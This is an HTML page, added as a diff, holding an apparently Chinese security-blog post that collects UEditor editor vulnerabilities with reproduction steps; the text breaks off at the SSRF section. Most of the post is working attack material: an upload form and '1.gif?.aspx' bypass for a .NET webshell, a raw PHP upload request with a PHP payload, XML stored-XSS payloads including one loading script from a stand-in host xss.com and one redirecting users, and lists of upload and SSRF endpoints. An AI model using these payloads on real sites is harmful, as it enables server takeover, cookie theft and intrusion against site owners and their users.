@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Ueditor编辑器漏洞总结 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="Ueditor编辑器漏洞总结" />
+<meta property="og:description" content="Ueditor编辑器漏洞总结 漏洞描述 UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="Ueditor编辑器漏洞总结"/>
+<meta name="twitter:description" content="Ueditor编辑器漏洞总结 漏洞描述 UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" /><link rel="prev" href="http://example.org/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/" /><link rel="next" href="http://example.org/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Ueditor编辑器漏洞总结",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1059 ,
+        "url": "http:\/\/example.org\/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ueditor编辑器漏洞总结</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1059 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a>
+      <ul>
+        <li><a href="#0x01-文件读取漏洞">0x01 文件读取漏洞</a></li>
+        <li><a href="#0x02-net版本-任意文件上传">0x02 .net版本 任意文件上传</a></li>
+        <li><a href="#0x03-php版本文件上传">0x03 php版本文件上传</a></li>
+        <li><a href="#0x03-存储型xss">0x03 存储型xss</a>
+          <ul>
+            <li><a href="#一些常见的xml弹窗poc">一些常见的xml弹窗poc</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x04-ssrf">0x04 ssrf</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="ueditor编辑器漏洞总结">Ueditor编辑器漏洞总结</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点，开源基于MIT协议，允许自由使用和修改代码。</p>
+<p>界面如下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/ueditor-1.webp"
+        data-srcset="images/ueditor-1.webp, images/ueditor-1.webp 1.5x, images/ueditor-1.webp 2x"
+        data-sizes="auto"
+        alt="images/ueditor-1.webp"
+        title="ueditor-1" /></p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<h3 id="0x01-文件读取漏洞">0x01 文件读取漏洞</h3>
+<p>file 目录文件读取：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.xxxx.com/net/controller.ashx?action=listfile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>image 目录文件读取：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x02-net版本-任意文件上传">0x02 .net版本 任意文件上传</h3>
+<p>只适用于 .net 版本，存在于<code>1.4.3.3</code>、<code>1.5.0</code>和<code>1.3.6</code>版本中。</p>
+<p>准备一台服务区存放图片马或者需要上传的文件，本地构造一个 <code>html</code> 页面用于上传使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://www.xxxx.com/ueditor/net/controller.ashx?action=catchimage&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;application/x-www-form-urlencoded&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>shell addr: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;source[]&#34;</span> <span class="p">/&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/ueditor-2.webp"
+        data-srcset="images/ueditor-2.webp, images/ueditor-2.webp 1.5x, images/ueditor-2.webp 2x"
+        data-sizes="auto"
+        alt="images/ueditor-2.webp"
+        title="ueditor-2" /></p>
+<ul>
+<li><code>shell addr</code> 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 <code>aspx</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://xxxx/1.gif?.aspx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>成功上传返回上传路径，可直连 getshell</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/ueditor-3.webp"
+        data-srcset="images/ueditor-3.webp, images/ueditor-3.webp 1.5x, images/ueditor-3.webp 2x"
+        data-sizes="auto"
+        alt="images/ueditor-3.webp"
+        title="ueditor-3" /></p>
+<h3 id="0x03-php版本文件上传">0x03 php版本文件上传</h3>
+<p>poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">action_upload</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span><span class="o">&amp;</span><span class="n">CONFIG</span><span class="p">[</span><span class="n">imagePathFormat</span><span class="p">]</span><span class="o">=</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">fuck</span><span class="o">&amp;</span><span class="n">CONFIG</span><span class="p">[</span><span class="n">imageMaxSize</span><span class="p">]</span><span class="o">=</span><span class="mi">9999999</span><span class="o">&amp;</span><span class="n">CONFIG</span><span class="p">[</span><span class="n">imageAllowFiles</span><span class="p">][]</span><span class="o">=.</span><span class="n">php</span><span class="o">&amp;</span><span class="n">CONFIG</span><span class="p">[</span><span class="n">imageFieldName</span><span class="p">]</span><span class="o">=</span><span class="n">fuck</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">localhost</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">222</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache</span><span class="o">-</span><span class="ne">Control</span><span class="p">:</span> <span class="nb">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="p">:</span> <span class="n">null</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">60.0</span><span class="o">.</span><span class="mf">3112.78</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=</span><span class="err">——</span><span class="n">WebKitFormBoundaryDMmqvK6b3ncX4xxA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">/</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.4</span>
+</span></span><span class="line"><span class="cl"><span class="err">———</span><span class="n">WebKitFormBoundaryDMmqvK6b3ncX4xxA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;fuck&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;fuck.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">octet</span><span class="o">-</span><span class="n">stream</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="n">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">———</span><span class="n">WebKitFormBoundaryDMmqvK6b3ncX4xxA</span><span class="err">—</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shell路径由CONFIG</span><span class="p">[</span><span class="n">imagePathFormat</span><span class="p">]</span><span class="o">=</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">fuck决定</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">fuck</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x03-存储型xss">0x03 存储型xss</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;head&gt;&lt;/head&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;something:script xmlns:something=&#34;http://www.w3.org/1999/xhtml&#34;&gt;alert(1)&lt;/something:script&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">盲打 Cookie、src=&#34;&#34;：
+</span></span><span class="line"><span class="cl">&lt;something:script src=&#34;&#34; xmlns:something=&#34;http://www.w3.org/1999/xhtml&#34;&gt;&lt;/something:script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">asp</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">asp</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">asp</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">asp</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadfile</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">ashx</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">ashx</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadfile</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadfile</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">jsp</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadfile</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="n">jsp</span><span class="o">/</span><span class="n">controller</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将<code>uploadimage</code>类型改为<code>uploadfile</code>，修改文件后缀名为<code>.xml</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/ueditor-4.webp"
+        data-srcset="images/ueditor-4.webp, images/ueditor-4.webp 1.5x, images/ueditor-4.webp 2x"
+        data-sizes="auto"
+        alt="images/ueditor-4.webp"
+        title="ueditor-4" /></p>
+<p>上传成功，访问成功弹框：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/ueditor-5.webp"
+        data-srcset="images/ueditor-5.webp, images/ueditor-5.webp 1.5x, images/ueditor-5.webp 2x"
+        data-sizes="auto"
+        alt="images/ueditor-5.webp"
+        title="ueditor-5" /></p>
+<h4 id="一些常见的xml弹窗poc">一些常见的xml弹窗poc</h4>
+<p>弹窗xss：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;something:script xmlns:something=&#34;http://www.w3.org/1999/xhtml&#34;&gt;alert(1);&lt;/something:script&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>url跳转：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;something:script xmlns:something=&#34;http://www.w3.org/1999/xhtml&#34;&gt;window.location.href=&#34;https://www.t00ls.net/&#34;;&lt;/something:script&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程加载js：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;something:script src=&#34;http://xss.com/xss.js&#34; xmlns:something=&#34;http://www.w3.org/1999/xhtml&#34;&gt;&lt;/something:script&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x04-ssrf">0x04 ssrf</h3>
+<p>该漏洞存在于<code>1.4.3</code>的<code>jsp版本</code>中，<code>1.4.3.1</code>版本已经修复。</p>
+<p>该版本ueditor的ssrf触发点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">jsp</span><span class="o">/</span><span class="nx">controller</span><span class="o">.</span><span class="nx">jsp</span><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">catchimage</span><span class="o">&amp;</span><span class="nx">source</span><span class="p">[]</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">jsp</span><span class="o">/</span><span class="nx">getRemoteImage</span><span class="o">.</span><span class="nx">jsp</span><span class="o">?</span><span class="nx">upfile</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">controller</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">catchimage</span><span class="o">&amp;</span><span class="nx">source</span><span class="p">[]</span><span class="o">=</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用百度logo构造poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
